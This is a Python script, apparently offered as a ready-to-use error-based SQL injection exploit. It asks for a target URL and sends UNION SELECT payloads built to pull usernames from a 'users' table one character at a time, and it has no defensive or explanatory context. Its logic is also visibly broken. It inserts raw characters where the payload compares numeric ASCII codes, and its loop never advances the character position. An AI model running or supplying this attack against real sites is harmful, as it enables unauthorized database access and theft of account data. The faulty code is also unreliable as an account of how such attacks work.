
#Error-Based SQL Injection Exploit

import requests

def exploit(url, payload):
    response = requests.get(url + payload)
    return response.text

def extract_error_message(response):
    # Parse error message from response
    error_message = ""
    for line in response.splitlines():
        if "error" in line.lower() or "warning" in line.lower():
            error_message += line.strip()
    return error_message

def brute_force(url, payload_template):
    extracted_data = ""
    for i in range(32):  # ASCII characters
        for j in range(128):
            payload = payload_template.replace("[CHAR]", chr(j))
            response = exploit(url, payload)
            error_message = extract_error_message(response)
            if "error" in error_message.lower():
                extracted_data += chr(j)
                break
    return extracted_data

url = input("[+] Target url: ")
payload_template = "1' UNION SELECT CONCAT([TABLE], ':', [COLUMN]) FROM [TABLE] WHERE ASCII(SUBSTRING([COLUMN], [POSITION], 1)) = [CHAR] --"

# Replace [TABLE], [COLUMN], and [POSITION] with actual values
table_name = "users"
column_name = "username"
position = 1
payload_template = payload_template.replace("[TABLE]", table_name).replace("[COLUMN]", column_name).replace("[POSITION]", str(position))

extracted_data = brute_force(url, payload_template)
print(extracted_data)
